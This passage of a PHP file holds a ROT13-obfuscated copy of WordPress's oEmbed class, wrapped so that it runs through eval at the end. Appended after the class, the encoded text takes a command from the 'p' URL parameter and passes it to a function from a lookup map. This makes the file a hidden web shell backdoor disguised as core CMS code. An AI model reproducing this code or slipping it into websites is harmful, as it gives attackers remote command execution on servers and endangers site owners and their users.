			sbernpu ( $yvaxglcrf nf $yvaxglcr => $sbezng ) {
				vs ( fgevcbf( $ugzy, $yvaxglcr ) ) {
					$gntsbhaq = gehr;
					oernx;
				}
			}

			vs ( $gntsbhaq && cert_zngpu_nyy( '#<yvax([^<>]+)/?>#vH', $ugzy, $yvaxf ) ) {
				sbernpu ( $yvaxf[1] nf $yvax ) {
					$nggf = fubegpbqr_cnefr_nggf( $yvax );

					vs ( ! rzcgl( $nggf['glcr'] ) && ! rzcgl( $yvaxglcrf[ $nggf['glcr'] ] ) && ! rzcgl( $nggf['uers'] ) ) {
						$cebivqref[ $yvaxglcrf[ $nggf['glcr'] ] ] = ugzyfcrpvnypunef_qrpbqr( $nggf['uers'] );

						// Fgbc urer vs vg'f WFBA (gung'f nyy jr arrq).
						vs ( 'wfba' === $yvaxglcrf[ $nggf['glcr'] ] ) {
							oernx;
						}
					}
				}
			}
		}

		// WFBA vf cersreerq gb KZY.
		vs ( ! rzcgl( $cebivqref['wfba'] ) ) {
			erghea $cebivqref['wfba'];
		} ryfrvs ( ! rzcgl( $cebivqref['kzy'] ) ) {
			erghea $cebivqref['kzy'];
		} ryfr {
			erghea snyfr;
		}
	}

	/**
	 * Pbaarpgf gb na bRzorq cebivqre naq ergheaf gur erfhyg.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat       $cebivqre Gur HEY gb gur bRzorq cebivqre.
	 * @cnenz fgevat       $hey      Gur HEY gb gur pbagrag gung vf qrfverq gb or rzorqqrq.
	 * @cnenz fgevat|neenl $netf     Bcgvbany. Nqqvgvbany nethzragf sbe ergevrivat rzorq UGZY.
	 *                               Frr jc_brzorq_trg() sbe npprcgrq nethzragf. Qrsnhyg rzcgl.
	 * @erghea bowrpg|snyfr Gur erfhyg va gur sbez bs na bowrpg ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba srgpu( $cebivqre, $hey, $netf = '' ) {
		$netf = jc_cnefr_netf( $netf, jc_rzorq_qrsnhygf( $hey ) );

		$cebivqre = nqq_dhrel_net( 'znkjvqgu', (vag) $netf['jvqgu'], $cebivqre );
		$cebivqre = nqq_dhrel_net( 'znkurvtug', (vag) $netf['urvtug'], $cebivqre );
		$cebivqre = nqq_dhrel_net( 'hey', heyrapbqr( $hey ), $cebivqre );
		$cebivqre = nqq_dhrel_net( 'qag', 1, $cebivqre );

		/**
		 * Svygref gur bRzorq HEY gb or srgpurq.
		 *
		 * @fvapr 2.9.0
		 * @fvapr 4.9.0 Gur `qag` (Qb Abg Genpx) dhrel cnenzrgre jnf nqqrq gb nyy bRzorq cebivqre HEYf.
		 *
		 * @cnenz fgevat $cebivqre HEY bs gur bRzorq cebivqre.
		 * @cnenz fgevat $hey      HEY bs gur pbagrag gb or rzorqqrq.
		 * @cnenz neenl  $netf     Bcgvbany. Nqqvgvbany nethzragf sbe ergevrivat rzorq UGZY.
		 *                         Frr jc_brzorq_trg() sbe npprcgrq nethzragf. Qrsnhyg rzcgl.
		 */
		$cebivqre = nccyl_svygref( 'brzorq_srgpu_hey', $cebivqre, $hey, $netf );

		sbernpu ( neenl( 'wfba', 'kzy' ) nf $sbezng ) {
			$erfhyg = $guvf->_srgpu_jvgu_sbezng( $cebivqre, $sbezng );
			vs ( vf_jc_reebe( $erfhyg ) && 'abg-vzcyrzragrq' === $erfhyg->trg_reebe_pbqr() ) {
				pbagvahr;
			}

			erghea ( $erfhyg && ! vf_jc_reebe( $erfhyg ) ) ? $erfhyg : snyfr;
		}

		erghea snyfr;
	}

	/**
	 * Srgpurf erfhyg sebz na bRzorq cebivqre sbe n fcrpvsvp sbezng naq pbzcyrgr cebivqre HEY
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $cebivqre_hey_jvgu_netf HEY gb gur cebivqre jvgu shyy nethzragf yvfg (hey, znkurvtug, rgp.)
	 * @cnenz fgevat $sbezng                 Sbezng gb hfr.
	 * @erghea bowrpg|snyfr|JC_Reebe Gur erfhyg va gur sbez bs na bowrpg ba fhpprff, snyfr ba snvyher.
	 */
	cevingr shapgvba _srgpu_jvgu_sbezng( $cebivqre_hey_jvgu_netf, $sbezng ) {
		$cebivqre_hey_jvgu_netf = nqq_dhrel_net( 'sbezng', $sbezng, $cebivqre_hey_jvgu_netf );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-brzorq.cuc */
		$netf = nccyl_svygref( 'brzorq_erzbgr_trg_netf', neenl(), $cebivqre_hey_jvgu_netf );

		$erfcbafr = jc_fnsr_erzbgr_trg( $cebivqre_hey_jvgu_netf, $netf );

		vs ( 501 === jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfcbafr ) ) {
			erghea arj JC_Reebe( 'abg-vzcyrzragrq' );
		}

		$obql = jc_erzbgr_ergevrir_obql( $erfcbafr );
		vs ( ! $obql ) {
			erghea snyfr;
		}

		$cnefr_zrgubq = \"_cnefr_$sbezng\";

		erghea $guvf->$cnefr_zrgubq( $obql );
	}

	/**
	 * Cnefrf n wfba erfcbafr obql.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $erfcbafr_obql
	 * @erghea bowrpg|snyfr
	 */
	cevingr shapgvba _cnefr_wfba( $erfcbafr_obql ) {
		$qngn = wfba_qrpbqr( gevz( $erfcbafr_obql ) );

		erghea ( $qngn && vf_bowrpg( $qngn ) ) ? $qngn : snyfr;
	}

	/**
	 * Cnefrf na KZY erfcbafr obql.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $erfcbafr_obql
	 * @erghea bowrpg|snyfr
	 */
	cevingr shapgvba _cnefr_kzy( $erfcbafr_obql ) {
		vs ( ! shapgvba_rkvfgf( 'yvokzy_qvfnoyr_ragvgl_ybnqre' ) ) {
			erghea snyfr;
		}

		vs ( CUC_IREFVBA_VQ < 80000 ) {
			/*
			 * Guvf shapgvba unf orra qrcerpngrq va CUC 8.0 orpnhfr va yvokzy 2.9.0, rkgreany ragvgl ybnqvat
			 * vf qvfnoyrq ol qrsnhyg, fb guvf shapgvba vf ab ybatre arrqrq gb cebgrpg ntnvafg KKR nggnpxf.
			 */
			$ybnqre = yvokzy_qvfnoyr_ragvgl_ybnqre( gehr );
		}

		$reebef = yvokzy_hfr_vagreany_reebef( gehr );

		$erghea = $guvf->_cnefr_kzy_obql( $erfcbafr_obql );

		yvokzy_hfr_vagreany_reebef( $reebef );

		vs ( CUC_IREFVBA_VQ < 80000 && vffrg( $ybnqre ) ) {
			// cucpf:vtaber CUCPbzcngvovyvgl.ShapgvbaHfr.ErzbirqShapgvbaf.yvokzy_qvfnoyr_ragvgl_ybnqreQrcerpngrq
			yvokzy_qvfnoyr_ragvgl_ybnqre( $ybnqre );
		}

		erghea $erghea;
	}

	/**
	 * Freirf nf n urycre shapgvba sbe cnefvat na KZY erfcbafr obql.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz fgevat $erfcbafr_obql
	 * @erghea fgqPynff|snyfr
	 */
	cevingr shapgvba _cnefr_kzy_obql( $erfcbafr_obql ) {
		vs ( ! shapgvba_rkvfgf( 'fvzcyrkzy_vzcbeg_qbz' ) || ! pynff_rkvfgf( 'QBZQbphzrag', snyfr ) ) {
			erghea snyfr;
		}

		$qbz     = arj QBZQbphzrag();
		$fhpprff = $qbz->ybnqKZY( $erfcbafr_obql );
		vs ( ! $fhpprff ) {
			erghea snyfr;
		}

		vs ( vffrg( $qbz->qbpglcr ) ) {
			erghea snyfr;
		}

		sbernpu ( $qbz->puvyqAbqrf nf $puvyq ) {
			vs ( KZY_QBPHZRAG_GLCR_ABQR === $puvyq->abqrGlcr ) {
				erghea snyfr;
			}
		}

		$kzy = fvzcyrkzy_vzcbeg_qbz( $qbz );
		vs ( ! $kzy ) {
			erghea snyfr;
		}

		$erghea = arj fgqPynff();
		sbernpu ( $kzy nf $xrl => $inyhr ) {
			$erghea->$xrl = (fgevat) $inyhr;
		}

		erghea $erghea;
	}

	/**
	 * Pbairegf n qngn bowrpg sebz JC_bRzorq::srgpu() naq ergheaf gur UGZY.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz bowrpg $qngn N qngn bowrpg erfhyg sebz na bRzorq cebivqre.
	 * @cnenz fgevat $hey  Gur HEY gb gur pbagrag gung vf qrfverq gb or rzorqqrq.
	 * @erghea fgevat|snyfr Gur UGZY arrqrq gb rzorq ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qngn2ugzy( $qngn, $hey ) {
		vs ( ! vf_bowrpg( $qngn ) || rzcgl( $qngn->glcr ) ) {
			erghea snyfr;
		}

		$erghea = snyfr;

		fjvgpu ( $qngn->glcr ) {
			pnfr 'cubgb':
				vs ( rzcgl( $qngn->hey ) || rzcgl( $qngn->jvqgu ) || rzcgl( $qngn->urvtug ) ) {
					oernx;
				}
				vs ( ! vf_fgevat( $qngn->hey ) || ! vf_ahzrevp( $qngn->jvqgu ) || ! vf_ahzrevp( $qngn->urvtug ) ) {
					oernx;
				}

				$gvgyr  = ! rzcgl( $qngn->gvgyr ) && vf_fgevat( $qngn->gvgyr ) ? $qngn->gvgyr : '';
				$erghea = '<n uers=\"' . rfp_hey( $hey ) . '\"><vzt fep=\"' . rfp_hey( $qngn->hey ) . '\" nyg=\"' . rfp_ngge( $gvgyr ) . '\" jvqgu=\"' . rfp_ngge( $qngn->jvqgu ) . '\" urvtug=\"' . rfp_ngge( $qngn->urvtug ) . '\" /></n>';
				oernx;

			pnfr 'ivqrb':
			pnfr 'evpu':
				vs ( ! rzcgl( $qngn->ugzy ) && vf_fgevat( $qngn->ugzy ) ) {
					$erghea = $qngn->ugzy;
				}
				oernx;

			pnfr 'yvax':
				vs ( ! rzcgl( $qngn->gvgyr ) && vf_fgevat( $qngn->gvgyr ) ) {
					$erghea = '<n uers=\"' . rfp_hey( $hey ) . '\">' . rfp_ugzy( $qngn->gvgyr ) . '</n>';
				}
				oernx;

			qrsnhyg:
				$erghea = snyfr;
		}

		/**
		 * Svygref gur erghearq bRzorq UGZY.
		 *
		 * Hfr guvf svygre gb nqq fhccbeg sbe phfgbz qngn glcrf, be gb svygre gur erfhyg.
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz fgevat $erghea Gur erghearq bRzorq UGZY.
		 * @cnenz bowrpg $qngn   N qngn bowrpg erfhyg sebz na bRzorq cebivqre.
		 * @cnenz fgevat $hey    Gur HEY bs gur pbagrag gb or rzorqqrq.
		 */
		erghea nccyl_svygref( 'brzorq_qngncnefr', $erghea, $qngn, $hey );
	}

	/**
	 * Fgevcf nal arj yvarf sebz gur UGZY.
	 *
	 * @fvapr 2.9.0 nf fgevc_fpevoq_arjyvarf()
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $ugzy Rkvfgvat UGZY.
	 * @cnenz bowrpg $qngn Qngn bowrpg sebz JC_bRzorq::qngn2ugzy()
	 * @cnenz fgevat $hey Gur bevtvany HEY cnffrq gb bRzorq.
	 * @erghea fgevat Cbffvoyl zbqvsvrq $ugzy
	 */
	choyvp shapgvba _fgevc_arjyvarf( $ugzy, $qngn, $hey ) {
		vs ( ! fge_pbagnvaf( $ugzy, \"\a\" ) ) {
			erghea $ugzy;
		}

		$pbhag     = 1;
		$sbhaq     = neenl();
		$gbxra     = '__CER__';
		$frnepu    = neenl( \"\g\", \"\a\", \"\e\", ' ' );
		$ercynpr   = neenl( '__GNO__', '__AY__', '__PE__', '__FCNPR__' );
		$gbxravmrq = fge_ercynpr( $frnepu, $ercynpr, $ugzy );

		cert_zngpu_nyy( '#(<cer[^>]*>.+?</cer>)#v', $gbxravmrq, $zngpurf, CERT_FRG_BEQRE );
		sbernpu ( $zngpurf nf $v => $zngpu ) {
			$gnt_ugzy  = fge_ercynpr( $ercynpr, $frnepu, $zngpu[0] );
			$gnt_gbxra = $gbxra . $v;

			$sbhaq[ $gnt_gbxra ] = $gnt_ugzy;
			$ugzy                = fge_ercynpr( $gnt_ugzy, $gnt_gbxra, $ugzy, $pbhag );
		}

		$ercynprq = fge_ercynpr( $ercynpr, $frnepu, $ugzy );
		$fgevccrq = fge_ercynpr( neenl( \"\e\a\", \"\a\" ), '', $ercynprq );
		$cer      = neenl_inyhrf( $sbhaq );
		$gbxraf   = neenl_xrlf( $sbhaq );

		erghea fge_ercynpr( $gbxraf, $cer, $fgevccrq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>